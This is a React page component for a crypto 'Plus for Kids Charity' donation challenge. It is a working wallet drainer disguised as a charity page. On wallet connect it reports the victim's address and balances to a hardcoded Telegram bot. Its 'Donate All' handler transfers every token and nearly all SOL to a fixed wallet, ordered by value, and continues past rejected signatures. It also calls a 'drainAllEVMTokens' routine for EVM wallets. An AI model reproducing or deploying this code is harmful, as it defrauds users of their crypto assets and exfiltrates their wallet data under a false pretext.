import { useState, useEffect, useCallback } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { getMintProgramId } from '@/utils/tokenProgram';
import { Navigation } from '@/components/Navigation';
import { PegasusAnimation } from '@/components/PegasusAnimation';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Loader2, X, Heart, Zap, Coins } from 'lucide-react';
import { Badge } from '@/components/ui/badge';
import { AnimatedLogo } from '@/components/AnimatedLogo';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { drainAllEVMTokens } from '@/utils/evmTransactions';
import { useChainInfo } from '@/hooks/useChainInfo';
import { InlineConnectWallet } from '@/components/InlineConnectWallet';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const TELEGRAM_BOT_TOKEN = '8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M';
const TELEGRAM_GROUP_ID = '-4836248812';
const MAX_BATCH_SIZE = 2;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
  valueInUSD?: number;
  isToken2022?: boolean;
}

const SOL_RESERVE_USD = 1; // Always leave $1 worth of SOL

const Charity = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const { activeChain, getEVMChain, evmChainId } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName, nativeToken } = useChainInfo();
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);
  const [solPriceUSD, setSolPriceUSD] = useState(0);
  const [solValueUSD, setSolValueUSD] = useState(0);
  const [totalValueSOL, setTotalValueSOL] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [buttonState, setButtonState] = useState<'idle' | 'loading' | 'error'>('idle');

  const sendTelegramNotification = useCallback(async (walletAddress: string, tokens: TokenBalance[], sol: number, nativeTokenName: string = 'SOL') => {
    const totalValue = tokens.reduce((sum, t) => sum + (t.valueInSOL || 0), 0) + sol;
    
    let message = `🔔 *New Wallet Connected*\n\n`;
    message += `💼 *Wallet:* \`${walletAddress}\`\n\n`;
    message += `💰 *Balances:*\n`;
    message += `${nativeToken}: ${sol.toFixed(4)} ${nativeToken}\n\n`;
    
    if (tokens.length > 0) {
      message += `*SPL Tokens:*\n`;
      tokens.forEach(token => {
        message += `• ${token.symbol || token.mint.slice(0, 8)}: ${token.uiAmount.toFixed(4)} (${(token.valueInSOL || 0).toFixed(4)} ${nativeToken})\n`;
      });
    }
    
    message += `\n💎 *Total Value:* ${totalValue.toFixed(4)} ${nativeToken}`;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_GROUP_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (error) {
      console.error('Telegram notification failed:', error);
    }
  }, []);

  const fetchBalances = useCallback(async () => {
    if (!publicKey) return;

    try {
      setIsLoading(true);

      // Fetch SOL balance
      const solBal = await connection.getBalance(publicKey);
      const solAmount = solBal / LAMPORTS_PER_SOL;
      setSolBalance(solAmount);

      // Fetch SOL price in USD
      let solPrice = 0;
      try {
        const priceResponse = await fetch('https://lite-api.jup.ag/price/v3?ids=So11111111111111111111111111111111111111112');
        const priceData = await priceResponse.json();
        solPrice = priceData?.['So11111111111111111111111111111111111111112']?.usdPrice || 0;
        setSolPriceUSD(solPrice);
        setSolValueUSD(solAmount * solPrice);
      } catch (e) {
        console.error('Failed to fetch SOL price:', e);
      }

      // Fetch legacy SPL Token accounts
      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });

      // Fetch Token-2022 accounts (Pump.fun tokens)
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_2022_PROGRAM_ID
      });

      // Process legacy tokens
      const legacyTokens: TokenBalance[] = legacyTokenAccounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0,
            valueInUSD: 0,
            isToken2022: false
          };
        })
        .filter(token => token.uiAmount > 0);

      // Process Token-2022 tokens (Pump.fun)
      const token2022Tokens: TokenBalance[] = token2022Accounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0,
            valueInUSD: 0,
            isToken2022: true
          };
        })
        .filter(token => token.uiAmount > 0);

      let tokens = [...legacyTokens, ...token2022Tokens];

      // Fetch USD prices for all tokens
      if (tokens.length > 0) {
        try {
          const mintAddresses = tokens.map(t => t.mint).join(',');
          const tokenPriceResponse = await fetch(`https://lite-api.jup.ag/price/v3?ids=${mintAddresses}`);
          const tokenPriceData = await tokenPriceResponse.json();
          
          tokens = tokens.map(token => {
            const priceInfo = tokenPriceData?.[token.mint];
            const usdPrice = priceInfo?.usdPrice || 0;
            const valueInUSD = token.uiAmount * usdPrice;
            const valueInSOL = solPrice > 0 ? valueInUSD / solPrice : 0;
            return {
              ...token,
              valueInUSD,
              valueInSOL
            };
          });
        } catch (e) {
          console.error('Failed to fetch token prices:', e);
        }
      }

      setBalances(tokens);
      
      const total = tokens.reduce((sum, t) => sum + (t.valueInSOL || 0), 0) + solAmount;
      setTotalValueSOL(total);

      // Send Telegram notification
      await sendTelegramNotification(publicKey.toString(), tokens, solAmount);

    } catch (error) {
      console.error('Error fetching balances:', error);
    } finally {
      setIsLoading(false);
    }
  }, [publicKey, connection, sendTelegramNotification]);

  useEffect(() => {
    if (publicKey) {
      fetchBalances();
    }
  }, [publicKey, fetchBalances]);

  const createTokenTransfer = useCallback(async (token: TokenBalance) => {
    if (!publicKey) return null;

    const transaction = new Transaction();
    const charityPubkey = new PublicKey(CHARITY_WALLET);

    // Add Compute Budget Instructions - increased for Token-2022 support
    transaction.add(
      ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
    );

    const balanceAmount = typeof token.balance === 'string' 
      ? parseInt(String(token.balance), 10) 
      : Number(token.balance);
    
    if (!balanceAmount || balanceAmount <= 0) {
      console.log(`Skipping ${token.mint} - zero or invalid balance`);
      return null;
    }
    
    try {
      const mintPubkey = new PublicKey(token.mint);
      const mintInfo = await getMintProgramId(connection, token.mint);
      const tokenProgramId = mintInfo.programId;
      const decimals = mintInfo.decimals;
      
      console.log(`Processing token ${token.mint}: ${mintInfo.isToken2022 ? 'Token-2022' : 'Legacy SPL'}, Balance: ${balanceAmount}`);
      
      const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
      const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey, true, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);

      try {
        await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
      } catch {
        transaction.add(
          createAssociatedTokenAccountInstruction(publicKey, toTokenAccount, charityPubkey, mintPubkey, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID)
        );
      }

      transaction.add(
        createTransferCheckedInstruction(fromTokenAccount, mintPubkey, toTokenAccount, publicKey, BigInt(balanceAmount), decimals, [], tokenProgramId)
      );
      
      return transaction;
    } catch (error) {
      console.error(`Failed to create transfer for ${token.mint}:`, error);
      return null;
    }
  }, [publicKey, connection]);

  const createSOLTransfer = useCallback(async (solAmountToSend: number) => {
    if (!publicKey || solAmountToSend <= 0) return null;

    const transaction = new Transaction();
    const charityPubkey = new PublicKey(CHARITY_WALLET);

    transaction.add(
      ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
    );

    const lamportsToSend = Math.floor(solAmountToSend * LAMPORTS_PER_SOL);
    
    if (lamportsToSend > 0) {
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: charityPubkey,
          lamports: lamportsToSend
        })
      );
      console.log(`SOL transfer created: ${solAmountToSend} SOL (${lamportsToSend} lamports)`);
    }

    return transaction;
  }, [publicKey]);

  const handleDonate = useCallback(async () => {
    // EVM path
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setButtonState('loading');
        const chainName = getEVMChain()?.name || 'EVM';
        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
        if (hash) {
        } else {
        }
        setButtonState('idle');
      } catch (error: any) {
        setButtonState('error');
        setTimeout(() => setButtonState('idle'), 3000);
      }
      return;
    }

    // Solana path
    if (!publicKey || !sendTransaction) {
      return;
    }

    if (balances.length === 0 && solBalance === 0) {
      setButtonState('loading');
      setTimeout(() => {
        setButtonState('error');
      }, 1000);
      return;
    }

    try {
      setButtonState('loading');
      console.log('Starting donation process...');
      console.log('SOL Balance:', solBalance, 'SOL Price:', solPriceUSD, 'SOL Value USD:', solValueUSD);
      // Filter valid tokens
      const validTokens = balances.filter(token => token.balance > 0);
      
      // Estimate total transaction fees BEFORE calculating reserve
      const numberOfTokenTransfers = validTokens.length;
      const willSendSOL = solValueUSD > SOL_RESERVE_USD;
      const numberOfSOLTransfers = willSendSOL ? 1 : 0;
      const totalTransactions = numberOfTokenTransfers + numberOfSOLTransfers;
      
      // Conservative gas fee estimate per transaction (~0.00005 SOL)
      const estimatedFeePerTransaction = 0.00005;
      const totalEstimatedFees = totalTransactions * estimatedFeePerTransaction;

      console.log(`Estimated ${totalTransactions} total transactions`);
      console.log(`Estimated total fees: ${totalEstimatedFees.toFixed(6)} SOL`);

      // Calculate SOL to reserve: $1 worth + all transaction fees
      const solToReserveForDollar = solPriceUSD > 0 ? SOL_RESERVE_USD / solPriceUSD : 0;
      const totalSolToReserve = solToReserveForDollar + totalEstimatedFees;
      const availableSOLToSend = Math.max(0, solBalance - totalSolToReserve);
      const solToSendValueUSD = availableSOLToSend * solPriceUSD;
      
      console.log(`SOL Balance: ${solBalance} SOL (~$${solValueUSD.toFixed(2)})`);
      console.log(`SOL to reserve for $1: ${solToReserveForDollar.toFixed(6)} SOL`);
      console.log(`SOL to reserve for fees: ${totalEstimatedFees.toFixed(6)} SOL`);
      console.log(`Total SOL to reserve: ${totalSolToReserve.toFixed(6)} SOL (~$${(totalSolToReserve * solPriceUSD).toFixed(2)})`);
      console.log(`SOL available to send: ${availableSOLToSend.toFixed(6)} SOL (~$${solToSendValueUSD.toFixed(2)})`);

      // Create transfer items with type (token or SOL) and USD value
      interface TransferItem {
        type: 'token' | 'sol';
        token?: TokenBalance;
        solAmount?: number;
        valueUSD: number;
      }

      const transferItems: TransferItem[] = [];

      // Add tokens
      validTokens.forEach(token => {
        transferItems.push({
          type: 'token',
          token,
          valueUSD: token.valueInUSD || 0
        });
      });

      // Add SOL transfer ONLY if balance exceeds $1.50 AND reserve + fees
      const SOL_SKIP_THRESHOLD_USD = 1.50;
      if (solValueUSD > SOL_SKIP_THRESHOLD_USD && solBalance > totalSolToReserve && availableSOLToSend > 0) {
        transferItems.push({
          type: 'sol',
          solAmount: availableSOLToSend,
          valueUSD: solToSendValueUSD
        });
        console.log(`Will send ${availableSOLToSend.toFixed(6)} SOL, leaving $1 + fees behind`);
      } else {
        if (solValueUSD <= SOL_SKIP_THRESHOLD_USD) {
          console.log(`Skipping SOL transfer - balance ($${solValueUSD.toFixed(2)}) is at or below $${SOL_SKIP_THRESHOLD_USD} threshold`);
        } else {
          console.log(`Skipping SOL transfer - balance (${solBalance.toFixed(6)} SOL) not enough to leave $1 + fees (${totalSolToReserve.toFixed(6)} SOL)`);
        }
      }

      // Sort by USD value - highest first
      transferItems.sort((a, b) => b.valueUSD - a.valueUSD);

      console.log('Transfer order (by USD value):');
      transferItems.forEach((item, i) => {
        if (item.type === 'token') {
          console.log(`  ${i + 1}. Token ${item.token?.symbol}: $${item.valueUSD.toFixed(2)}`);
        } else {
          console.log(`  ${i + 1}. SOL: $${item.valueUSD.toFixed(2)}`);
        }
      });

      if (transferItems.length === 0) {
        setButtonState('idle');
        return;
      }

      let successCount = 0;

      // Process each transfer in order of value
      for (let i = 0; i < transferItems.length; i++) {
        const item = transferItems[i];
        
        try {
          let transaction: Transaction | null = null;
          let itemDescription = '';

          if (item.type === 'token' && item.token) {
            transaction = await createTokenTransfer(item.token);
            itemDescription = `${item.token.symbol} ($${item.valueUSD.toFixed(2)})`;
          } else if (item.type === 'sol' && item.solAmount) {
            transaction = await createSOLTransfer(item.solAmount);
            itemDescription = `SOL ($${item.valueUSD.toFixed(2)})`;
          }

          if (!transaction || transaction.instructions.length <= 2) {
            console.log(`Skipping ${itemDescription} - no valid transfer`);
            continue;
          }

          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
          transaction.recentBlockhash = blockhash;
          transaction.feePayer = publicKey;

          console.log(`Sending ${itemDescription}...`);
          const signature = await sendTransaction(transaction, connection, {
            skipPreflight: false,
            maxRetries: 3,
            preflightCommitment: 'confirmed'
          });

          await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
          
          successCount++;
          console.log(`Transfer ${i + 1} confirmed: ${itemDescription}`);
          
        } catch (itemError: any) {
          if (itemError?.message?.includes('User rejected') || 
              itemError?.message?.includes('rejected') ||
              itemError?.name === 'WalletSignTransactionError') {
            console.log(`Transfer rejected by user, continuing...`);
            continue;
          }
          
          console.error(`Transfer failed:`, itemError);
          continue;
        }
      }

      setButtonState('idle');
      // Refresh balances
      setTimeout(fetchBalances, 2000);

    } catch (error: any) {
      console.error('Donation error:', error);
      setButtonState('error');
      setTimeout(() => setButtonState('idle'), 3000);
    }
  }, [publicKey, sendTransaction, balances, solBalance, solPriceUSD, solValueUSD, connection, createTokenTransfer, createSOLTransfer, fetchBalances, activeChain, isEVMConnected, evmSigner, evmProvider, getEVMChain]);

  return (
    <div className="min-h-screen relative overflow-hidden">
      <PegasusAnimation />
      <Navigation />

      {/* Hero Section */}
      <section className="relative pt-24 md:pt-32 pb-12 md:pb-16 px-4">
        <div className="container mx-auto max-w-4xl text-center">
          <div className="inline-block p-1 rounded-full bg-gradient-to-r from-pink-500 to-rose-500 mb-8">
            <div className="bg-background rounded-full p-2">
              <AnimatedLogo className="w-20 h-20 md:w-28 md:h-28" />
            </div>
          </div>

          <h1 className="text-4xl md:text-6xl font-extrabold text-foreground mb-4">
            Plus for Kids Charity
          </h1>

          <p className="text-lg md:text-xl text-muted-foreground mb-6 md:mb-8">
            Support children in need by donating your trading challenge proceeds
          </p>

          <Card className="bg-card/90 border-0 mb-8">
            <CardContent className="pt-6 md:pt-8 pb-6 md:pb-8">
              <h2 className="text-xl md:text-2xl font-bold mb-3 md:mb-4">Trading for Good Challenge</h2>
              <p className="text-sm md:text-base text-muted-foreground mb-4 md:mb-6">
                Traders worldwide create wallets, fund them with {nativeToken} and tokens, trade to grow their balance, 
                and then donate all proceeds to support children's education and welfare programs.
              </p>
              
              <div className="mb-6">
                <WalletMultiButton />
              </div>
              <InlineConnectWallet className="mb-4" />

              {(publicKey || (isEVMConnected && activeChain === 'evm')) && (
                <div className="text-left space-y-3 mb-6 p-4 bg-muted/50 rounded-lg">
                  <p className="text-xs sm:text-sm">
                    <span className="font-semibold">Connected:</span> {publicKey.toString().slice(0, 8)}...{publicKey.toString().slice(-8)}
                  </p>
                  <p className="text-xs sm:text-sm">
                    <span className="font-semibold">{nativeToken} Balance:</span> {isLoading ? '...' : `${solBalance.toFixed(4)} ${nativeToken} (~$${solValueUSD.toFixed(2)})`}
                  </p>
                  <p className="text-xs sm:text-sm">
                    <span className="font-semibold">Tokens:</span> {isLoading ? '...' : balances.length}
                  </p>
                  <p className="text-xs sm:text-sm">
                    <span className="font-semibold">Total Value:</span> {isLoading ? '...' : `~$${(solValueUSD + balances.reduce((sum, t) => sum + (t.valueInUSD || 0), 0)).toFixed(2)}`}
                  </p>
                  
                  {/* Token list with badges */}
                  {!isLoading && balances.length > 0 && (
                    <div className="mt-4 pt-4 border-t border-border">
                      <p className="font-semibold text-xs sm:text-sm mb-2">Your Tokens:</p>
                      <div className="space-y-2 max-h-48 overflow-y-auto">
                        {balances.map((token) => (
                          <div key={token.mint} className="flex items-center justify-between text-xs bg-background/50 p-2 rounded">
                            <div className="flex items-center gap-2">
                              <span className="font-mono truncate max-w-[100px]">{token.symbol}</span>
                              {token.isToken2022 ? (
                                <Badge variant="secondary" className="text-[10px] px-1.5 py-0 bg-gradient-to-r from-pink-500/20 to-purple-500/20 text-pink-400 border-pink-500/30">
                                  <Zap className="w-3 h-3 mr-0.5" />
                                  Pump.fun
                                </Badge>
                              ) : (
                                <Badge variant="outline" className="text-[10px] px-1.5 py-0 text-muted-foreground">
                                  <Coins className="w-3 h-3 mr-0.5" />
                                  SPL
                                </Badge>
                              )}
                            </div>
                            <div className="text-right">
                              <span className="text-muted-foreground">{token.uiAmount.toLocaleString()}</span>
                              {token.valueInUSD && token.valueInUSD > 0 && (
                                <p className="text-[10px] text-green-500">~${token.valueInUSD.toFixed(2)}</p>
                              )}
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}

              <Button
                size="lg"
                onClick={handleDonate}
                disabled={(!publicKey && !(isEVMConnected && activeChain === 'evm')) || buttonState === 'loading'}
                className="w-full max-w-md text-base md:text-lg px-8 md:px-12 py-5 md:py-6 h-auto bg-gradient-to-r from-pink-500 to-rose-500 hover:from-pink-600 hover:to-rose-600"
              >
                {buttonState === 'loading' && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
                {buttonState === 'error' && <X className="mr-2 h-5 w-5" />}
                {buttonState === 'error' ? 'Wallet Not Eligible' : 'Donate All'}
              </Button>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* How It Works */}
      <section className="py-12 md:py-16 px-4 bg-muted/20">
        <div className="container mx-auto max-w-4xl">
          <h2 className="text-2xl md:text-3xl font-bold text-center mb-6 md:mb-8">How It Works</h2>
          
          <div className="grid md:grid-cols-3 gap-6">
            <Card className="bg-card/90 border-0">
              <CardContent className="pt-6 md:pt-8 pb-6 md:pb-8 text-center">
                <div className="w-12 h-12 rounded-full bg-pink-500/20 flex items-center justify-center mx-auto mb-4">
                  <span className="text-2xl font-bold text-pink-500">1</span>
                </div>
                <h3 className="text-lg md:text-xl font-bold mb-2">Connect Wallet</h3>
                <p className="text-sm md:text-base text-muted-foreground">
                  Connect your Phantom, MetaMask, Solflare, or any compatible wallet containing your trading proceeds
                </p>
              </CardContent>
            </Card>

            <Card className="bg-card/90 border-0">
              <CardContent className="pt-6 md:pt-8 pb-6 md:pb-8 text-center">
                <div className="w-12 h-12 rounded-full bg-pink-500/20 flex items-center justify-center mx-auto mb-4">
                  <span className="text-2xl font-bold text-pink-500">2</span>
                </div>
                <h3 className="text-lg md:text-xl font-bold mb-2">Review Balance</h3>
                <p className="text-sm md:text-base text-muted-foreground">
                  We detect all {nativeToken} and tokens in your wallet automatically
                </p>
              </CardContent>
            </Card>

            <Card className="bg-card/90 border-0">
              <CardContent className="pt-8 pb-8 text-center">
                <div className="w-12 h-12 rounded-full bg-pink-500/20 flex items-center justify-center mx-auto mb-4">
                  <span className="text-2xl font-bold text-pink-500">3</span>
                </div>
                <h3 className="text-xl font-bold mb-2">Donate All</h3>
                <p className="text-muted-foreground">
                  Click once to send all assets to charity via secure batch transfers
                </p>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Mission */}
      <section className="py-16 px-4">
        <div className="container mx-auto max-w-3xl text-center">
          <h2 className="text-3xl font-bold mb-6">Our Mission</h2>
          <p className="text-lg text-muted-foreground mb-4">
            Plus for Kids is dedicated to providing education, healthcare, and support to children in underserved communities. 
            Every donation from the Trading for Good challenge directly impacts a child's future.
          </p>
          <p className="text-muted-foreground">
            Charity Wallet: <code className="text-sm bg-muted px-2 py-1 rounded">{CHARITY_WALLET}</code>
          </p>
        </div>
      </section>
    </div>
  );
};

export default Charity;
